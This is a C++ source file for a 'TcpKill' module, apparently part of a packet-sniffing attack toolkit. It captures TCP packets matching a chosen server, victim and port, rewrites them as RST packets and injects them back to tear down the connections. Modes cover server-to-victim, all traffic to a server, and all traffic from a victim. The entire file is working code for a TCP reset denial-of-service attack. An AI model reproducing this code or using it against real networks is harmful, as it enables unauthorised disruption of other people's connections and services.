#include "TcpKill.hh"

TcpKill::TcpKill(Core &core, std::ostream *out, std::string &dstIp, std::string &srcIp, std::string &port)
    : ASniffer(core, "TcpKill", "tcp and dst port " + port + " and dst host " + dstIp + " and src host " + srcIp, out), _dstIp(dstIp), _srcIp(srcIp), _port(std::stoi(port)), _type(TcpKill::ServerToVictim)
{
    *_out << "TcpKill started for " << _dstIp << ":" << _port << " -> " << _srcIp;
}

TcpKill::TcpKill(Core &core, std::ostream *out, std::string &dstIp, std::string &port)
    : ASniffer(core, "TcpKill", "tcp and dst port " + port + " and dst host " + dstIp, out), _dstIp(dstIp), _srcIp("0.0.0.0"), _port(std::stoi(port)), _type(TcpKill::AllToServer)
{
    *_out << "TcpKill started for " << _dstIp << ":" << _port << " -> " << _srcIp;
}

TcpKill::TcpKill(Core &core, std::ostream *out, std::string &srcIp, std::string &port, bool flag)
    : ASniffer(core, "TcpKill", "tcp and dst port " + port + " and src host " + srcIp, out), _dstIp("0.0.0.0"), _srcIp(srcIp), _port(std::stoi(port)), _type(TcpKill::VictimToAll)
{
    (void)flag;
    *_out << "TcpKill started for " << _dstIp << ":" << _port << " -> " << _srcIp;
}

std::string TcpKill::info(void)
{
    std::stringstream   ss;

    ss << "Kill traffic from " << _dstIp << ":" << _port << " -> " << _srcIp;
    return ss.str();
}

std::string TcpKill::help(void)
{
    return std::string("Start TcpKill.\n") + "\tOptions : <dstIp> <srcIp> <port>";
}

bool TcpKill::handler(PDU &pdu)
{
    // EthernetII / IP / TCP
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    TCP tcp = ip.rfind_pdu<TCP>();

    // It's a legitimate tcp packet on right port ? (Not a crafted)
    if (tcp.dport() == _port && tcp.get_flag(TCP::RST) == 0)
    {
        tcp.set_flag(TCP::RST, 1);
        tcp.set_flag(TCP::ACK, 0);
        tcp.set_flag(TCP::SYN, 0);

        // Build our packet
        EthernetII pkt = EthernetII(eth.dst_addr(), eth.src_addr()) /
                IP(ip.dst_addr(), ip.src_addr()) / tcp;

        // Kill traffic only between Server and Victim
        if (_type == TcpKill::ServerToVictim && ip.dst_addr() == _dstIp && ip.src_addr() == _srcIp)
        {
            // Send it!
            _core.send(pkt);
        }
        else if (_type == TcpKill::AllToServer && ip.dst_addr() == _dstIp) // Kill all traffic from Server
        {
            // Send it!
            _core.send(pkt);
        }
        else if (_type == TcpKill::VictimToAll && ip.src_addr() == _srcIp) // Kill all traffic from Victim
        {
            // Send it!
            _core.send(pkt);
        }
    }
    return true;
}
